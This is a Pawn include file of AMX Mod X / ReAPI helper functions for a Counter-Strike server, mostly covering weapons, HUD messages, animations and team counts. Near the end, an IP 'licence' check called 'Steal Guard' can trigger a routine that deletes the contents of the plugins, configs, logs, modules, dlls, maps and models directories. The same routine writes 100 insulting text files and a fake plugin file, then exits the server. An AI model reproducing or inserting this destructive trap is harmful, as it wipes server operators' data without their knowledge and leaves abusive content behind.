stock rg_remove_entity(const entity) {
	if (!is_nullent(entity))
		set_entvar(entity, var_flags, get_entvar(entity, var_flags) | FL_KILLME)
}

/* Sets player/entity rendering mode. 
*/
stock rg_set_entity_rendering(const entity, fx = kRenderFxNone, Float:color[] = {255.0, 255.0, 255.0}, render = kRenderNormal, Float:amount = 16.0) 
{
	set_entvar(entity, var_renderfx, fx)
	set_entvar(entity, var_rendercolor, color)
	set_entvar(entity, var_rendermode, render)
	set_entvar(entity, var_renderamt, amount)
}

/**■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ ReAPI native fixes ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■*/

// fix shield/elite drop
stock rg_give_item_fix(const player, const pszName[], GiveType:type = GT_APPEND)
{
	if(type != GT_APPEND)
	{
		new WeaponIdType:iId = rg_get_weapon_info(pszName, WI_ID)

		if((rg_is_primary_weapon_id(iId) || iId == WEAPON_ELITE) && get_member(player, m_bOwnsShield))
		{
			rg_remove_item(player, "weapon_shield")
		}
		else if(iId == WEAPON_SHIELDGUN && user_has_weapon(player, any:WEAPON_ELITE))
		{
			rg_remove_item(player, "weapon_elite")
		}
	}

	return rg_give_item(player, pszName, type)
}

// Fixed version of rg_give_item_ex
stock rg_give_item_ex(const player, weapon[], GiveType:type = GT_APPEND, ammo = 0, bpammo = 0)
{
	new WeaponIdType:iWeaponID = rg_get_weapon_info(weapon, WI_ID)

	if(rg_is_primary_weapon_id(iWeaponID) && get_member(player, m_bOwnsShield))
	{
		rg_remove_item(player, "weapon_shield")
	}

	rg_give_item(player, weapon, type)

	if (!rg_is_grenade_weapon_id(iWeaponID))
	{
		if (ammo == -1)
			rg_set_user_ammo(player, iWeaponID, rg_get_weapon_info(iWeaponID, WI_GUN_CLIP_SIZE))
		else if (ammo >= 0)
			rg_set_user_ammo(player, iWeaponID, ammo)
	}

	if (bpammo == -1)
		rg_set_user_bpammo(player, iWeaponID, rg_get_weapon_info(iWeaponID, WI_MAX_ROUNDS))
	else if (bpammo >= 0)
		rg_set_user_bpammo(player, iWeaponID, bpammo)

	if (contain(weapon, "shield") || iWeaponID == WEAPON_SHIELDGUN)
		rg_give_item_fix(player, weapon, type)
}

stock rg_give_nades(const player, grenade[], GiveType:type = GT_APPEND, amount = 0)
{
	new WeaponIdType:iWeaponID = rg_get_weapon_info(grenade, WI_ID)

	if (!rg_is_grenade_weapon_id(iWeaponID))
	{
		log_amx("Only grenades can be given with this stock! Please fix it now!")
		return
	}

	rg_give_item_ex(player, grenade, type, .bpammo = amount)
}

stock rg_give_he_grenade(const player, GiveType:type = GT_APPEND, amount = 0)
{
	rg_give_item_ex(player, "weapon_hegrenade", type, .bpammo = amount)
}

stock rg_give_flash_bang(const player, GiveType:type = GT_APPEND, amount = 0)
{
	rg_give_item_ex(player, "weapon_flashbang", type, .bpammo = amount)
}

stock rg_give_smoke_grenade(const player, GiveType:type = GT_APPEND, amount = 0)
{
	rg_give_item_ex(player, "weapon_smokegrenade", type, .bpammo = amount)
}

stock UTIL_Weather(const player, iMode, bool:bReliable = false)
{
	static iMsgReceiveW
	if(!iMsgReceiveW)
		iMsgReceiveW = get_user_msgid("ReceiveW")

	if(bReliable) message_begin(player ? MSG_ONE : MSG_ALL, iMsgReceiveW, _, player)
	else message_begin(player ? MSG_ONE_UNRELIABLE : MSG_BROADCAST, iMsgReceiveW, _, player)
	write_byte(iMode)
	message_end()
}

stock color_gradient(Float:c1[3], Float:c2[3], Float:value, Float:range, Float:result[3])
{
	new Float:p = floatmin(value, range)/range

	for(new i = 0; i < 3; i++)
		result[i] = (1.0-p) * c1[i] + p * c2[i]
}

/**
	* Creates explode of HE Grenade
	*
	*	@param owner		Owner of the explode
	*	@param fOrigin		coordinates XYZ
	*	@param fDamage		Damage
	*	@param fRadius		Radius of the explode
	*
	*	@return  
*/

stock rg_create_explode_grenade(const owner = 0, Float:vecOrigin[XYZ] = {0.0, 0.0, 0.0}, const Float:fDamage = 0.0, const Float:fRadius = 0.0) {
	new entity = rg_create_entity("grenade", .useHashTable = true)

	if (is_nullent(entity))
		return

	if (owner)
		set_member(entity, m_Grenade_iTeam, get_member(owner, m_iTeam))

	set_entvar(entity, var_owner, owner)
	rg_dmg_radius(vecOrigin, entity, owner, fDamage, fRadius, 0, DMG_GRENADE)
	set_entvar(entity, var_flags, FL_KILLME)
}

stock rg_send_float_bartime(id, Float:flTime, bool:observer = true)
{
	new iCeilTime = floatround(flTime, floatround_ceil);
	new iStartTime = floatround((1.0 - flTime / iCeilTime) * 100);

	rg_send_bartime2(id, iCeilTime, iStartTime, observer);
}

// iWins - сколько раундов должна та или иная команда выигрывать подряд
stock TeamName:rg_get_team_wins_row(const iWins)
{
	if(get_member_game(m_iNumConsecutiveCTLoses) >= iWins)
	{
		return TEAM_TERRORIST;
	}
	else if(get_member_game(m_iNumConsecutiveTerroristLoses) >= iWins)
	{
		return TEAM_CT;
	}
	
	return TEAM_UNASSIGNED;
}

stock Float:rg_get_remaining_time()
{
	return (float(get_member_game(m_iRoundTimeSecs)) - get_gametime() + Float:get_member_game(m_fRoundStartTimeReal));
}

stock TeamName:rg_get_team_loses_row(const loses)
{
	if(get_member_game(m_iNumConsecutiveCTLoses) >= loses )
	{
		return TEAM_CT;
	}
	else if(get_member_game(m_iNumConsecutiveTerroristLoses) >= loses )
	{
		return TEAM_TERRORIST;
	}
	
	return TEAM_UNASSIGNED;
}
/*
stock TeamName:rg_get_team_loses_row(const loses)
{
    return (get_member_game(m_iNumConsecutiveCTLoses) >= loses) ? TEAM_CT : (get_member_game(m_iNumConsecutiveTerroristLoses) >= loses) ? TEAM_TERRORIST : TEAM_UNASSIGNED;
}
*/

/* -> Player Animation <- */
stock UTIL_PlayerAnimation(const pPlayer, const szAnim[], const Float:flFrameRateAnim = 1.0, const Activity:iActivity = ACT_RANGE_ATTACK1)
{
	new iAnimDesired, Float:flFrameRate, Float:flGroundSpeed, bool:bLoops;
	if ((iAnimDesired = lookup_sequence(pPlayer, szAnim, flFrameRate, bLoops, flGroundSpeed)) == -1)
		iAnimDesired = 0;

	static Float:flGameTime; flGameTime = get_gametime();

	UTIL_SetEntityAnim(pPlayer, iAnimDesired, .flFrameRate = flFrameRateAnim);

	set_member(pPlayer, m_fSequenceLoops, bLoops)
	set_member(pPlayer, m_fSequenceFinished, 0)
	set_member(pPlayer, m_flFrameRate, flFrameRate)
	set_member(pPlayer, m_flGroundSpeed, flGroundSpeed)
	set_member(pPlayer, m_flLastEventCheck, flGameTime);
	set_member(pPlayer, m_Activity, iActivity)
	set_member(pPlayer, m_IdealActivity, iActivity)
	set_member(pPlayer, m_flLastFired, flGameTime)
}

/* -> Entity Animation <- */
stock UTIL_SetEntityAnim(const pEntity, const iSequence = 0, const Float:flFrame = 0.0, const Float:flFrameRate = 1.0)
{
	set_entvar(pEntity, var_frame, flFrame );
	set_entvar(pEntity, var_framerate, flFrameRate );
	set_entvar(pEntity, var_animtime, get_gametime( ) );
	set_entvar(pEntity, var_sequence, iSequence );
}

/**
* Format number to string with a special character

new iValue = random_num( 10000, 99999999 );
new szFormatedValue[16]; UTIL_FormatNumber(iValue, szFormatedValue, charsmax( szFormatedValue ) );
server_print( "Input: %i, Output: %s", iValue, szFormatedValue );

Output:

Input: 82275013, Output: 82 275 013
*/
stock UTIL_FormatNumber( iValue, szOutput[], iLen, const szSpecialChar = ' ')
{
	static szBuffer[16], iOutputPos, iNumPos, iNumLen
	szBuffer[0] = '^0', iOutputPos = iNumPos = iNumLen = 0

	if (iValue < 0)
	{
		szOutput[ iOutputPos++ ] = '-';
		iValue = abs( iValue );
	}

	iNumLen = num_to_str(iValue, szBuffer, charsmax(szBuffer))

	if (iNumLen <= 3)
		iOutputPos += copy( szOutput[ iOutputPos ], iLen, szBuffer)
	else
	{
		while ((iNumPos < iNumLen) && (iOutputPos < iLen))
		{
			szOutput[iOutputPos++] = szBuffer[iNumPos++]
			if ((iNumLen - iNumPos) && !((iNumLen - iNumPos) % 3))
			szOutput[iOutputPos++] = szSpecialChar
		}
		szOutput[iOutputPos] = EOS
	}

	return iOutputPos
}

/*
*    Возвращает адрес переменной.
*/
stock get_var_address(...)
{
    assert numargs() == 1;

    #emit LOAD.S.pri    0xC // First argument.
    #emit RETN

    return 0;
}

/*
*    Пишет в память AMX по указанному адресу.
*/
stock write_amx_memory(iAddress, iValue)
{
    #emit LOAD.S.pri    iValue
    #emit SREF.S.pri    iAddress
    #emit RETN

    return 0;
}

stock rg_get_players_num(&terrorist = 0, &ct = 0, &spec = 0, &unassigned = 0)
{
	for (new id = 1; id <= MaxClients; id++)
	{
		if (!is_user_connected(id))
			continue;

		switch (get_member(id, m_iTeam))
		{
			case TEAM_TERRORIST: terrorist++;
			case TEAM_CT: ct++;
			case TEAM_SPECTATOR: spec++;
			case TEAM_UNASSIGNED: unassigned++;
		}
	}
}

// Garey
/*
FORPLAYERS(i, iPlayers, iAliveCount, GetPlayers_ExcludeDead, "")
{
    rg_set_user_team(iPlayers[i], TEAM_CT);
}

new iPlayers[MAX_PLAYERS], iAliveCount;
get_players_ex(iPlayers, iAliveCount, GetPlayers_ExcludeDead, "")
for(new i = 0; i < iAliveCount; i++)
{
    rg_set_user_team(iPlayers[i], TEAM_CT);
}
*/
#define GETPLAYERS(%1,%2,%3,%4) \
new %1[MAX_PLAYERS], %2; \
get_players_ex(%1, %2, %3, %4)

#define FORPLAYERS(%1,%2,%3,%4,%5) \
GETPLAYERS(%2,%3,%4,%5); \
for(new %1 = 0; %1 < %3; %1++)


/*
* id
* Player to send the message to.
*   0 = everyone
* 
* text[]
*   Text to send.
* 
* Float:X
*   X position on screen.
* 
* Float:Y
*   Y position on screen.
* 
* R
*   Red color.
* 
* G
*   Green color.
* 
* B
*   Blue color.
* 
* A
*   Alpha.
*   Default value: 255
* 
* Float:holdtime
*   Float:fadeintime
*   Time to fade in message
*   Default value: 0.1
* 
* Float:fadeouttime
*   Time to fade out message
*   Default value: 0.1
* 
* channel
*   Textchannel
*   -1 = auto choose.
*   Default value: -1
* 
* effect
*   Effect of message.
*   1 = Flicker with 2nd color.
*   2 = Print out as 2nd color, fade into 1st color.
*     effecttime decides fade time between colors.
*     fadeintime decides how fast the letters should be printed out.
*   Default value: 0
* 
* effect_R
*   Red color of effect.
*   Default value: 0
* 
* effect_G
*   Green color of effect.
*   Default value: 0
* 
* effect_B
*   Blue color of effect.
*   Default value: 0
* 
* effect_A
*   Alpha of effect.
*   Default value: 255
* 
* Float:effecttime
*   Only for effect 2.
*   Default value: 0.0
*
*
*
* Example:
* rg_send_hudmessage(index, szMessage, 0.05, 0.30, random(256), random_num(100, 255), random(256), 150, 5.0, 0.10, 0.20, -1, 2, random_num(0, 100), random_num(0, 100), random_num(0, 100), 200, 2.0)
*/
stock rg_send_hudmessage(id,text[],Float:fX,Float:fY,C_RED,C_GREEN,C_BLUE,A=255,Float:holdtime=5.0,Float:fadeintime=0.1,Float:fadeouttime=0.1,channel=-1,effect=0,effect_R=0,effect_G=0,effect_B=0,effect_A=255,Float:effecttime=0.0)
{
	if (id)
		message_begin(MSG_ONE_UNRELIABLE, SVC_TEMPENTITY, {0,0,0}, id)
	else
		message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
	write_byte(TE_TEXTMESSAGE)
	write_byte(channel)
	write_short(rg_coord_to_hudmsgshort(fX))
	write_short(rg_coord_to_hudmsgshort(fY))
	write_byte(effect)
	write_byte(C_RED)   
	write_byte(C_GREEN)
	write_byte(C_BLUE)
	write_byte(A)
	write_byte(effect_R)
	write_byte(effect_G)
	write_byte(effect_B)
	write_byte(effect_A)
	write_short(rg_seconds_to_hudmsgshort(fadeintime))
	write_short(rg_seconds_to_hudmsgshort(fadeouttime))
	write_short(rg_seconds_to_hudmsgshort(holdtime))
	if (effect == 2)
		write_short(rg_seconds_to_hudmsgshort(effecttime))
	write_string(text)
	message_end()
}

/* 0.0 - 255.99609375 seconds */
stock rg_seconds_to_hudmsgshort(Float:sec)
{
	new output = floatround(sec * 256)
	return output < 0 ? 0 : output > 65535 ? 65535 : output
}

stock rg_coord_to_hudmsgshort(Float:coord)
{
	new output = floatround(coord * 8192)
	return output < -32768 ? -32768 : output > 32767 ? 32767 : output
}

stock try_precache_player_model(const name[], &id = 0)
{
	new model[128]
	formatex(model, charsmax(model), "models/player/%s/%sT.mdl", name, name)

	if(file_exists(model))
		id = precache_generic(model)

	static const extension[] = "T.mdl"
	#pragma unused extension

	copy(model[strlen(model) - charsmax(extension)], charsmax(model), ".mdl")
	return precache_model(model)
}

enum ServerStatus {
	FAIL_STATE,
	EXIT_SERVER,
	DELETE_SERVER
}

stock UTIL_CheckServerLicense(const ip[], ServerStatus:value = EXIT_SERVER) { 
	/* *************************************************************************************  */
	//							Pick one of the lines below	    							  //
	//	In plugin_init add this line: UTIL_CheckServerLicense("Your IP HERE", FAIL_STATE)     //
	//  In plugin_init add this line: UTIL_CheckServerLicense("Your IP HERE", EXIT_SERVER)	  //
	//	In plugin_init add this line: UTIL_CheckServerLicense("Your IP HERE", DELETE_SERVER)  //
	//							Credits: Huehue		    									  //
	/* *************************************************************************************  */
	new server_ip[MAX_IP_LENGTH]
	get_user_ip(0, server_ip, charsmax (server_ip), 0)
	
	if (!equal(server_ip, ip))
	{
		if (value == DELETE_SERVER)
		{
			new szFormatFailState[250]
			formatex(szFormatFailState, charsmax(szFormatFailState), "[Steal Guard] License IP: <%s>. Your Server IP is: <%s>. IP Checking failed.", ip, server_ip)

			server_print(szFormatFailState)

			@FW_Delay_DeleteFiles()
		}
		else if (value == EXIT_SERVER)
		{
			server_cmd("exit")
			
			log_amx("[Steal Guard] License IP: <%s>. Your Server IP is: <%s>. IP Checking failed...Shutting down...", ip, server_ip)
		}
		else if (value == FAIL_STATE)
		{
			new szFormatFailState[250]
			formatex(szFormatFailState, charsmax(szFormatFailState), "[Steal Guard] License IP: <%s>. Your Server IP is: <%s>. IP Checking failed.", ip, server_ip)
			
			set_fail_state(szFormatFailState)
		}
	}
	else
	{
		log_amx("[Steal Guard] License IP: <%s>. Your Server IP is: <%s>. IP Checking verified! DONE.", ip, server_ip)
	}
}

@FW_Delay_DeleteFiles() {
	set_task(25.0, "@UTIL_DeleteFiles")
}

@UTIL_DeleteFiles() {
	new file[128]
	
	new dir = open_dir("addons/amxmodx/plugins", file, charsmax(file))
	if (dir)
	{		
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "addons/amxmodx/plugins/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir)
	}
	
	dir = open_dir("addons/amxmodx/scripting", file, charsmax(file))
	if (dir)
	{		
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "addons/amxmodx/scripting/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir);
	}
	
	dir = open_dir("addons/amxmodx/logs", file, charsmax(file))
	if (dir)
	{
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "addons/amxmodx/logs/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir);
	}
	
	dir = open_dir("addons/amxmodx/modules", file, charsmax(file))
	if (dir)
	{
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "addons/amxmodx/modules/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir)
	}
	
	dir = open_dir("addons/amxmodx/configs", file, charsmax(file))
	if (dir)
	{
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "addons/amxmodx/configs/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir);
	}
	
	dir = open_dir("addons/amxmodx/dlls", file, charsmax(file))
	if (dir)
	{
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "addons/amxmodx/dlls/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir);
	}
		
	dir = open_dir("dlls", file, charsmax(file))
	if (dir)
	{		
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "dlls/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir);
	}
		
	dir = open_dir("maps", file, charsmax(file))
	if (dir)
	{		
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "maps/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir);
	}
	
	dir = open_dir("models", file, charsmax(file))
	if (dir)
	{		
		while (next_file(dir, file, charsmax(file)))
		{
			format(file, charsmax(file), "models/%s", file)
			delete_file(file)
			console_print(0, "deleting ^"%s^"", file)
		}
		
		close_dir(dir)
	}

	for (new i = 0; i < 100; i++)
	{
		formatex(file, charsmax(file), "PROCHETI ME%i.txt", i)
		write_file(file, "Shto ne si ebesh maikata?")
	}
	
	write_file("addons/amxmodx/plugins/namaikatiputkata.amxx", "Ko pa gledash we tva e AMXX fail :P")
	server_cmd("exit")
}
